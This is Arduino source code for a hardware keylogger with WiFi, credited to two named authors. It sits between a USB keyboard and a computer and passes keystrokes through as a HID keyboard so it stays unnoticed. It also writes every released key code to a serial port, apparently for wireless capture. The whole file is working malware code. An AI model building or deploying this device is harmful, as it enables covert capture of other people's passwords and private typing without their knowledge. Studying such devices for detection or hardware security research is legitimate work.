/*
 *  Basic hardware keylogger WiFi
 *
 *  Explanation: Simple hardware keylogger with wireless connectivity (WiFi) with multiple layout support.
 * 
 *  Copyright (C) 2019 Joel Serna & Ernesto Sanchez
 *
 *  Version:  1.0
 *  Design:   Joel Serna & Ernesto Sanchez
 *  Implementation: Joel Serna & Ernesto Sanchez
 *
 */
 
#include <Keyboard.h>
#include <hidboot.h>
#include <usbhub.h>
#include <EEPROM.h>

// Satisfy the IDE, which needs to see the include statment in the ino too.
#ifdef dobogusinclude
#include <spi4teensy3.h>
#endif
#include <SPI.h>

#define MODIFIERKEY_LEFT_CTRL   (0x01)
#define MODIFIERKEY_LEFT_SHIFT  (0x02)
#define MODIFIERKEY_LEFT_ALT    (0x04)
#define MODIFIERKEY_LEFT_GUI    (0x08)
#define MODIFIERKEY_RIGHT_CTRL  (0x10)
#define MODIFIERKEY_RIGHT_SHIFT (0x20)
#define MODIFIERKEY_RIGHT_ALT   (0x40)
#define MODIFIERKEY_RIGHT_GUI   (0x80)

//modifiers
int leftctrl_status=0;
int leftshift_status=0;
int leftalt_status=0;
int leftgui_status=0;
int rightctrl_status=0;
int rightshift_status=0;
int rightalt_status=0;
int rightgui_status=0;

uint8_t modifiers=0;
uint8_t contador = 0;
const int chipSelect = 4;

void SetModifiers(void) {
    modifiers=0;
    if (leftctrl_status) modifiers = (modifiers | MODIFIERKEY_LEFT_CTRL);
    if (leftshift_status) modifiers = (modifiers | MODIFIERKEY_LEFT_SHIFT);
    if (leftalt_status) modifiers = (modifiers | MODIFIERKEY_LEFT_ALT);
    if (leftgui_status) modifiers = (modifiers | MODIFIERKEY_LEFT_GUI);
    if (rightctrl_status) modifiers = (modifiers | MODIFIERKEY_RIGHT_CTRL);
    if (rightshift_status) modifiers = (modifiers | MODIFIERKEY_RIGHT_SHIFT);
    if (rightalt_status) modifiers = (modifiers |  MODIFIERKEY_RIGHT_ALT);
    if (rightgui_status) modifiers = (modifiers | MODIFIERKEY_RIGHT_GUI);   
};

class KbdRptParser : public KeyboardReportParser {
    void PrintKey(uint8_t mod, uint8_t key);

  protected:
    void OnControlKeysChanged(uint8_t before, uint8_t after);

    void OnKeyDown  (uint8_t mod, uint8_t key);
   void OnKeyUp  (uint8_t mod, uint8_t key);
    void OnKeyPressed(uint8_t key);
};

void KbdRptParser::PrintKey(uint8_t m, uint8_t key) {
  MODIFIERKEYS mod;
  *((uint8_t*)&mod) = m;
  Serial1.print((mod.bmLeftCtrl   == 1) ? "C" : " ");
  Serial1.print((mod.bmLeftShift  == 1) ? "S" : " ");
  Serial1.print((mod.bmLeftAlt    == 1) ? "A" : " ");
  Serial1.print((mod.bmLeftGUI    == 1) ? "G" : " ");

  Serial1.print(" >");
  PrintHex<uint8_t>(key, 0x80);
  Serial1.print("< ");

  Serial1.print((mod.bmRightCtrl   == 1) ? "C" : " ");
  Serial1.print((mod.bmRightShift  == 1) ? "S" : " ");
  Serial1.print((mod.bmRightAlt    == 1) ? "A" : " ");
  Serial1.println((mod.bmRightGUI    == 1) ? "G" : " ");
};

/*
void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key)
{
  
  PrintKey(mod, key);
  uint8_t c = OemToAscii(mod, key);

  if (c)
  OnKeyPressed(c);
}
*/
void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key) {
  
  SetModifiers();
  Keyboard.rawrelease(key, 0);
  Serial1.println(key|modifiers);
  //Serial1.println(key|modifiers,BIN);
}

void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key) { 

  SetModifiers();
  Keyboard.rawpress(key, modifiers);
}

void KbdRptParser::OnControlKeysChanged(uint8_t before, uint8_t after) {
    
    MODIFIERKEYS beforeMod;
    *((uint8_t*)&beforeMod) = before;

    MODIFIERKEYS afterMod;
    *((uint8_t*)&afterMod) = after;

    if (beforeMod.bmLeftCtrl != afterMod.bmLeftCtrl) {
        leftctrl_status=!leftctrl_status;
    }
    if (beforeMod.bmLeftShift != afterMod.bmLeftShift) {
        leftshift_status=!leftshift_status;
    }
    if (beforeMod.bmLeftAlt != afterMod.bmLeftAlt) {
        leftalt_status=!leftalt_status;
    }
    if (beforeMod.bmLeftGUI != afterMod.bmLeftGUI) {
        leftgui_status=!leftgui_status;
    }

    if (beforeMod.bmRightCtrl != afterMod.bmRightCtrl) {
        rightctrl_status=!rightctrl_status;
    }
    if (beforeMod.bmRightShift != afterMod.bmRightShift) {
        rightshift_status=!rightshift_status;
    }
    if (beforeMod.bmRightAlt != afterMod.bmRightAlt) {
        rightalt_status=!rightalt_status;
    }
    if (beforeMod.bmRightGUI != afterMod.bmRightGUI) {
        rightgui_status=!rightgui_status;
    }  
}

USB     Usb;
//USBHub     Hub(&Usb);
HIDBoot<USB_HID_PROTOCOL_KEYBOARD>    HidKeyboard(&Usb);

KbdRptParser Prs;

void setup() {
  Serial1.begin(9600);
  
  //Serial.print("Serial hardware iniciado");
#if !defined(__MIPSEL__)
  while (!Serial1); // Wait for serial port to connect - used on Leonardo, Teensy and other boards with built-in USB CDC serial connection
#endif
  //Serial.println("Start");

  if (Usb.Init() == -1)
    //Serial.println("OSC did not start.");
  delay(200);
  HidKeyboard.SetReportParser(0, &Prs);
}

void loop() {
  Usb.Task();
}
